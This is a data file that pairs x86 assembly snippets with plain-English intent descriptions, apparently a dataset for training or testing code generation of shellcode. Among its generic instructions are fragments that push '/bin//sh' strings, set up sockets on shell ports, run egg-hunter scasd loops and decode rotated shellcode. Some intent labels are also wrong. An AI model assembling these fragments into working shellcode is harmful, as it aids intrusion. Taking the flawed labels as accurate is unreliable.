SNIPPETS	INTENTS
push word 0x662d \n mov esi, esp	load the hexadecimal word value 0x6632d in esi register
push word 0x662d \n mov esi, esp	push the word 0x662d onto the stack and point the esi register to the stack register
push word 0x6666	push the word 0x6666 onto the stack
push word 0x6873	push the word 0x6873 onto the stack
push word 0x692d	push the word 0x692d onto the stack
push word 0x697a	push the word 0x697a onto the stack
push word 0x6d6f	push the word 0x6d6f onto the stack
push word 0x6f64	push the word 0x6f64 to the stack
push word 0x6f64	push the word 0x6f64 onto the stack
push word 0x7065	push the word 0x7065 onto the stack
push word 0x722d	push the word 0x722d onto the stack
push word 0x7365	push the word 0x7365 onto the stack
push word 0x736e	push the word 0x736e onto the stack
push word 0x776f	push the word 0x776f onto the stack
push word 0x7773	push the word 0x7773 to the stack
push word 0x7773	push the word 0x7773 onto the stack
push word 0x8223	push port number 9090 on stack
push word 0x8223	push the word 0x8223 onto the stack
push word 0xaaaa	push the word 0xaaaa onto the stack
push word 0xb315	push port number 5555 (little-endian)
push word 0xb315	push the word 0xb315 onto the stack
push word 0xc005	push sin6_port 2 byte (port 1472) on stack
push word 0xc005	push port 1472 (hex)
push word 0xc005	push the word 0xc005 onto the stack
push word 0xc005	push the word 0xc005 to the stack
push word 0xffff	push the hexadecimal value 0xffff on stack
push word 0xffff	push the word 0xffff onto the stack
push word 0xffff	push the word 0xffff to the stack
push word 1 \n mov eax, esp	push the word 1 onto the stack and point eax to the stack register
push word 10	push sa_family_t=2 byte on stack
push word 10	push the word 10 to the stack
push word 100	push the word 100 onto the stack
push word 17 \n mov edx, esp	push the word 17 onto the stack and point edx to the stack register
push word 2	push 2 onto stack
push word 2	push the word 2 onto the stack
push word 2 \n mov ecx, esp	push the word 2 onto the stack and point ecx to the stack register
push word 21 \n mov ebx, esp	push the word 21 onto the stack and point ebx to the stack register
push word ax	push ax content represented on 32 bit on stack
push word ax	push the word ax onto the stack
push word bx	push the 32 bit register bx on the stack
push word bx	push af_inet =2 as a word
push word bx	push sin6_addr on 16 byte, saved in bx, on stack
push word bx	push af_inet as a word
push word bx	push the word bx onto the stack
push word bx	push the word bx to the stack
push word cx	push af_inet = 2
push word cx	push the word cx onto the stack
push zero_reg	push the zero_reg onto the stack
push zero_reg	push zero_reg onto the stack
push_cmd:	declare push_cmd label
push_cmd:	declare the push_cmd label
pusha	pushe all general purpose registers onto the stack in the following order: (e)ax, (e)cx, (e)dx, (e)bx, (e)sp, (e)bp, (e)si, (e)di. the value of sp is the value before the actual push of sp.
pushl $0x68732f2f	push $0x68732f2f onto the stack
pushl $0x6e69622f	push $0x6e69622f onto the stack
pushw $0x632d	push $0x632d onto the stack
pushw 0x2	push 2 on stack as a word
pushw 0x2	push af_inet = 2
pushw 0x2	push af_inet=2 as a word on stack
pushw 0x3905	push the value of port 1336 as a word on stack
pushw 0x3905	push the 0x3905 onto the stack
pushw 0x682d	push the 0x682d onto the stack
pushw 0x697a	push the 0x697a onto the stack
pushw 0xb315	push port number 5555 (little-endian)
pushw 0xb822	push pot number 47138 as a word on stack
pushw 0xe324	push port number on stack as a word
pxor mm0, mm1	run pxor operation between mm0 and mm1
pxor mm0, mm1	perform xor operation
R1: \n inc esi	in the routine R1 point to the next byte in esi
R1: \n inc esi \n inc esi	in the routine R1 point to the next word in esi
R1: \n pop esi	in the routine R1 save the shellcode in esi
R2: \n inc esi	declare R2 and point to the next byte in esi
R2: \n inc esi \n inc esi	declare R2 and point to the next word in esi
rcl al,1	rotate the bits into al register to the left for 1 time
re	define label re
read_file:	define read_file_label
read:	define read_label
read:	define _read label
read:	declare the read label
reading:	define _reading label
reading:	declare the reading label
real_number1 dd 1234	define the doubleword variable real_number1 and initialize to 1234
real_number2 dd 123456	define the doubleword variable real_number2 and initialize 123456
realarray resq 10	reserve an array of ten reals for realarray
realarray resq 10	reserve array realarray of 10 real numbers
reseting the register	pushing null terminator
ret	transfer control to the previous instruction address saved on stack
ret	return
ret	return the address off the stack and returns control to that location
ret	return to our program
ret	return to the address on the top of the stack
ret	return to where the function was called
ret	return to caller
ret 0x8585	transfer control to the instruction at the adress 0x8585
ret 0xc885	transfer control to the instruction at the adress 0x8585
retry:	define _retry label
retry:	declare retry label
returnlabel:	returnlabel label
rol byte [esi], 0x1	rol decode with 1 offset
rol byte [esi], 0x1	left rotate the byte in esi 1 time
rol byte [esi], 0x1	left rotate the shellcode by one
rol byte [esi], 0x2	left shift all bits of esi 2 times
rol byte [esi], 0x2	left rotate the byte at the address esi by 0x2 bits
rol byte [esi], 0x2	left rotate the byte in esi 2 times
rol byte [esi], 4	execute a rotation to the left of the first character pointed from esi for 4 times
rol byte [esi], 4	rotate 4 bits left the byte starting at the address esi
rol edi, 1	left rotate the contents of the edi register by 1 bit
rol edi, 1	left rotate the edi register 1 time
rol edx, 0x4	left shift all bits of edx 4 times
rol edx, 0x4	left rotate the contents of the edx register by 0x4 bits
rol edx, 0x4	left rotate the edx register 4 times
ror bl, cl	right rotate bl by the contents of cl
ror byte [esi], 0x1	ror decode with 1 offset
ror byte [esi], 0x1	right rotate the byte in esi 1 time
ror byte [esi], 0x1	right rotate the shellcode in esi by one
ror esi, 1	right rotate esi 1 time
ror esi, 1	right rotate the contents of the esi register by 1 bit
rot_decode:	define rot_decode_label
rotate:	declare _rotate label
rotate:	declare the rotate label
S1: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	S1 is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73
S2: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	define S2 as the array of bytes 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
S3: dw 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	S3 is an array of words 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73
S4: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	define S4 as the array of words 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
sar eax, 23	right shift the contents of eax by 23 bits
sar eax, 31	right shift the contents of eax by 31 bits
sar ebx, 31	right shift the contents of ebx by 31 bits
sar ecx, 2	right shift the value of register ecx by 2 bits
sar edx, 4	right shift the value of register edx by 4 bits
scas eax,dword ptr es:[edi]	compare value at location edi with eax register
scasd	check if [edi] == eax then increment edi while
scasd	compare eax with doubleword at edi and set status flags
scasd	compare the contents of the eax register with doubleword at edi and set status flags
scasd	compare the value in eax to the doubleword addressed by edi
scasd	compare the value in the eax register to the doubleword addressed by the edi register
scasd \ jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _end	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _start	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _start \n jmp edi	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _start \n scasd \n jnz _start	checking current address with egg two times
scasd \n jnz IncAddr	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz IncAddr \n jmp edi	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz next_addr \n scasd \n jnz next_addr	check if [edi] == eax then increment edi while if no match go to next_addr label. repeat two times
scasd \n l1 IncAddr	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n l1 IncAddr \n jmp edi	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
search_the_egg:	define search_the_egg label
section .bss	declare section containing uninitialized data
section .bss	declare the bss section
section .bss	section bss
section .bss	declare section bss
section .bss	declare bss section
section .bss	declare code section .bss
section .data	declare section .data
section .data	delcare section .data
section .data	define section .data
section .data	declare section containing initialized data
section .data	declare the data section
section .data	section data
section .data	section for initialized data
section .data	declare data section
section .data \n section .bss \n section .text \n global _start \n _start:	declare section.data, section .bss, section.text, global _start, _start label
section .text	declare text section
section .text	declare section containing code
section .text	declare section text
section .text	declare the text section
section .text	section .text
section .text	declare .text section
section .text	declare code section
section .text	section text
section .text \n _start:	declare section .data and _start label
section .text \n global _start \n _start:	declare section .text, global _start, _start:
section .text \n global _start \n _start:	declare section. text, global _start, _start label
section .text \n global _start \n _start:	declare section.text, global _start and _start label
section .text \n global _start \n _start:	delcare section .text, global _start and _start label
set_argv:	declare set_argv label
set_argv:	declare the set_argv label
set_argv:	define set_argv label
set_mark:	define set_mark label
set_mark:	declare the set_mark label
setup:	define _steup label
setup:	declare the setup label
shell_ret:	define shell_ret label
shell_ret:	declare the shell_ret label
shell:	define _ shell label
shell:	define _shell label
shell:	declare the shell label
shellcode_length equ $-shellcode	define the size of the shellcode = 25 byte
shellcode_length equ $-shellcode	define shellcode_length equal to the size of shellcode
shellcode_section \n call decoder	in shellcode_section go to decoder's main
shellcode:	declare _shellcode label
